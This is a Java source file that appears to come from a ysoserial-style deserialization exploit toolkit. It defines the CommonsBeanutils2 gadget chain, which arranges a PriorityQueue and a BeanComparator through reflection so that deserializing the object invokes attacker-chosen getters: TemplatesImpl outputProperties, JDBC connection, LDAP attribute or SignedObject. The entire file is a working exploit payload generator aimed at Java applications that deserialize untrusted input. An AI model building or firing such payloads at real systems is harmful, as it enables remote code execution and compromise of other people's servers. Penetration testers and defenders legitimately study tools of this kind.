package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.custom.CustomCommand;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import java.util.PriorityQueue;

import static cn.butler.yso.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2","commons-logging:commons-logging:1.2"})
@Authors({ Authors.PHITHON })
public class CommonsBeanutils2 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        final Object object = Gadgets.createGetter(command);
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        String property_value = "";
        if (command.startsWith(CustomCommand.GETTER_JDBC)) {
            property_value = "connection";
        }else if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL) || command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)){
            property_value = "outputProperties";
        }else if(command.startsWith(CustomCommand.GETTER_LDAPATTRIBUTE)){
            property_value = "attributeDefinition";
        }else if(command.startsWith(CustomCommand.GETTER_SIGNEDOBJECT)){
            property_value = "object";
        }
        Reflections.setFieldValue(comparator, "property", property_value);
        setFieldValue(queue, "queue", new Object[]{object, object});

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2.class, args);
    }
}
